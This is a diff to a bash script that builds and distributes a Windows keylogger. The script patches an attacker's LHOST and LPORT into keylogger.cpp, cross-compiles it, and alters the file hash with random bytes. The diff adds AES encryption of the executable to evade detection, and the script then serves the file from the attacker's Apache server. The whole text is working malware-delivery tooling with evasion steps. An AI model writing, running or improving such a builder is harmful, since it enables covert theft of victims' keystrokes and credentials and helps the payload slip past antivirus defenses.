@@ -23,7 +23,7 @@ show_options() {
   echo -e "\e[93mTo generate keylogger, type: generate\e[0m"
 }
 
-# Function to compile, modify hash, and set up keylogger
+# Function to compile, encrypt, modify hash, and set up keylogger
 generate_keylogger() {
   echo "Updating C++ code with the provided LHOST and LPORT..."
   sed -i "s/REPLACE_WITH_LHOST/$LHOST/" keylogger.cpp
@@ -32,18 +32,21 @@ generate_keylogger() {
   echo "Compiling the C++ code..."
   x86_64-w64-mingw32-g++ -static-libgcc -static-libstdc++ keylogger.cpp -o keylogger.exe -lws2_32 -mwindows
 
-  echo "Modifying the hash of the executable randomly..."
-  echo "$(date +%s) $(head -c 20 /dev/urandom | base64)" >> keylogger.exe
+  echo "Encrypting the executable..."
+  openssl enc -aes-256-cbc -salt -in keylogger.exe -out keylogger.enc -pass pass:YourPasswordHere
 
-  echo "Compilation and hash modification completed. The executable is keylogger.exe"
+  echo "Modifying the hash of the encrypted file randomly..."
+  echo "$(date +%s) $(head -c 20 /dev/urandom | base64)" >> keylogger.enc
 
-  echo "Moving the keylogger executable to the Apache server directory..."
-  sudo mv keylogger.exe /var/www/html/
+  echo "Compilation, encryption, and hash modification completed. The encrypted keylogger is keylogger.enc"
+
+  echo "Moving the encrypted keylogger to the Apache server directory..."
+  sudo mv keylogger.enc /var/www/html/
 
   echo "Starting Apache server..."
   sudo systemctl start apache2
 
-  echo "The keylogger is available at: http://$LHOST/keylogger.exe"
+  echo "The encrypted keylogger is available at: http://$LHOST/keylogger.enc"
 }
 
 # Function to start the Python server
@@ -55,7 +58,7 @@ start_server() {
 # Ensure the system is updated and install necessary packages
 echo "Updating system and installing necessary packages..."
 sudo apt-get update
-sudo apt-get install -y mingw-w64 python3 apache2 git upx
+sudo apt-get install -y mingw-w64 python3 apache2 git upx openssl
 
 # Display the banner
 display_banner
